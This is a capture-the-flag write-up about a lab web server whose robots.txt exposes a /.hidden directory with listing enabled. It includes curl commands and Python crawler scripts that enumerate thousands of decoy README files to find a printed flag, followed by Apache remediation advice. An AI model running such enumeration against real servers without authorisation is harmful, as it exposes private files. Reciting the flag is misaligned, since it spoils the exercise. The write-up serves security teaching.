# 🚩 10 : Sensitive Directory Exposure via .hidden

## 📝 Overview

`robots.txt` revealed a directory called `/.hidden`. The server had directory listing enabled, meaning anyone could browse its contents like a file explorer. Inside were thousands of folders, each containing a README file. Most were decoys with fake messages. One contained the flag. Finding it required writing a script to crawl all 17,000 folders automatically.

## 🔍 The Vulnerability

### robots.txt

`robots.txt` is covered in depth in breach 8. The short version: it is a public file that lists paths the developer wanted to hide from search engines. It does not hide anything. It tells everyone exactly where to look. In this case it revealed two paths: `/whatever` (breach 8) and `/.hidden` (this breach).

### Directory listing

When you visit a folder on a web server and there is no index file inside it, the server has two options. It can return 403 Forbidden, which is the correct behaviour. Or it can display the contents of the folder like a file browser, which is what this server does.

Visiting `http://192.168.64.2/.hidden/` returned a full listing of every folder inside it. This is called directory listing, and it is a misconfiguration. It should be disabled on any production server.

### The structure

The `.hidden` directory contains 26 folders at the first level, each named with a random lowercase string. Each of those contains 26 more folders. Each of those contains 26 more folders. At the bottom of each third-level folder sits a README file.

```
.hidden/
└── amcbevgondgcrloowluziypjdh/
    └── acbnunauucfplzmaglkvqgswwn/
        └── ayuprpftypqspruffmkuucjccv/
            └── README
```

26 × 26 × 26 = 17,576 folders in total, each with a README. Checking them manually is not realistic. A script is the only sensible approach.

### The French decoy messages

Most README files contain one of these French phrases:

```
Demande à ton voisin de gauche      Ask your left neighbour
Demande à ton voisin de droite      Ask your right neighbour
Demande à ton voisin du dessus      Ask your neighbour above
Demande à ton voisin du dessous     Ask your neighbour below
Non ce n'est toujours pas bon ...   No, still not right...
Toujours pas tu vas craquer non ?   Still not there, are you going to crack?
Tu veux de l'aide ? Moi aussi !     You want help? Me too!
```

These are deliberate decoys designed to frustrate manual searching. If you were clicking through folders one by one, you would spend hours reading these and never find the real flag. The script cuts through all of them by reading every README and printing only the ones it has not seen before. The flag stands out immediately because it looks nothing like the French phrases.

---

## 🛠 The Exploit

### Step 1: Discover the path

Visiting `http://192.168.64.2/robots.txt` returned:

```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

### Step 2: Confirm directory listing is enabled

```bash
curl -s http://192.168.64.2/.hidden/
```

The server returned a full HTML listing of folders instead of 403 Forbidden, confirming directory listing is on and we can enumerate the entire structure.

### Step 3: Map the structure

Running curl on a level 3 folder confirmed what we needed to know. We picked one specific path and fetched it to see what was inside:

```bash
curl -s http://192.168.64.2/.hidden/amcbevgondgcrloowluziypjdh/acbnunauucfplzmaglkvqgswwn/ayuprpftypqspruffmkuucjccv/
```

```html
<a href="README">README</a>
```

The server returned only one item inside that folder: a README file with no subfolders below it. We tested one branch and found the README at level 3. We assumed the structure was consistent across all branches and the script confirmed this by finding the flag. However we only verified one path — some branches could theoretically go deeper. A script that only looks at level 3 would miss those READMEs entirely.

### Step 4: Run the script

Since there are at least 17,576 README files to check, we wrote a Python script that crawls all three levels, reads every README, and prints only unique content. The flag appears once among the French decoys.

```python
import urllib.request
import re

base = 'http://192.168.64.2/.hidden/'

def get_links(url):
    res = urllib.request.urlopen(url).read().decode()
    return re.findall(r'href="([a-z][^"]+/)"', res)

seen = set()
for d1 in get_links(base):
    for d2 in get_links(base+d1):
        for d3 in get_links(base+d1+d2):
            content = urllib.request.urlopen(base+d1+d2+d3+'README').read().decode().strip()
            if content not in seen:
                seen.add(content)
                print(content)
```

**How to run it:**

Save the script as `hidden.py` and run:

```bash
python3 hidden.py
```

**Output:**

```
Demande à ton voisin de gauche
Non ce n'est toujours pas bon ...
Demande à ton voisin du dessous
Demande à ton voisin du dessus
Toujours pas tu vas craquer non ?
Demande à ton voisin de droite
Tu veux de l'aide ? Moi aussi !

Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

The `seen` set ensures each unique message is printed only once. Without it the script would print the same French phrases thousands of times. The flag appears at the end because it is the only README content that appears exactly once across all the files checked.

### A more robust version

Now, the script above assumes all READMEs are exactly at level 3. But a more defensive approach uses recursion. It checks for a README at every level it visits and keeps going deeper as long as it finds subfolders. This would catch the flag regardless of how deep it sits:

```python
import urllib.request
import re

base = 'http://192.168.64.2/.hidden/'
seen = set()

def get_links(url):
    res = urllib.request.urlopen(url).read().decode()
    return re.findall(r'href="([a-z][^"]+/)"', res)

def crawl(url, depth=0):
    if depth > 5:
        return
    try:
        content = urllib.request.urlopen(url + 'README').read().decode().strip()
        if content not in seen:
            seen.add(content)
            print(content)
    except:
        pass
    for link in get_links(url):
        crawl(url + link, depth + 1)

crawl(base)
```

This version visits every folder it can find, tries to read a README at each level, and only stops when it reaches depth 5 or runs out of subfolders. The `try/except` handles the case where no README exists at a given level without crashing.

---

## 🏁 Result

```
FLAG: d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
```

---

## 🌍 Real-World Impact

Directory listing on its own might seem minor. You can see filenames but not necessarily sensitive data. Combined with other failures it becomes much more serious. Here this vulnerability allowed us to enumerate the entire hidden directory structure of the server, which would expose any sensitive files sitting inside it: configuration files, backups, credentials, source code.

In real-world incidents, exposed directory listings have led to mass downloads of user data, leaked source code, and exposed database backups that were sitting in a publicly accessible folder the developer thought nobody would find.

---

## 🛡️ Remediation Strategies

### Disable directory listing

In Apache, add this to the server configuration or `.htaccess`:

```apache
Options -Indexes
```

This makes the server return 403 Forbidden when a directory has no index file, instead of listing its contents.

### Never use robots.txt to hide sensitive content

`robots.txt` is public. Any path listed in it is immediately visible to anyone who reads the file. Sensitive directories must be protected by authentication, not by hoping search engines skip them.

### Use proper access controls

If a directory must exist on the server but should not be publicly accessible, protect it with authentication:

```apache
<Directory /var/www/html/.hidden>
    AuthType Basic
    AuthName "Restricted"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</Directory>
```

Or block all access entirely:

```apache
<Directory /var/www/html/.hidden>
    Require all denied
</Directory>
```

### Do not store sensitive files inside the web root

Files that should never be publicly accessible — credentials, backups, configuration files — should live outside `/var/www/html/` entirely, in a location the web server cannot serve.

---

📊 Attack Chain Summary

```
1. Read robots.txt          →  found /.hidden listed as disallowed
2. Visited /.hidden/        →  server returned directory listing instead of 403
3. Explored the structure   →  3 levels of randomly named folders, README at each endpoint
4. Identified the problem   →  17,576 folders to check, manual search impossible
5. Wrote Python script      →  crawled all folders, printed unique README contents
6. Flag found               →  one README contained the flag among French decoy messages
```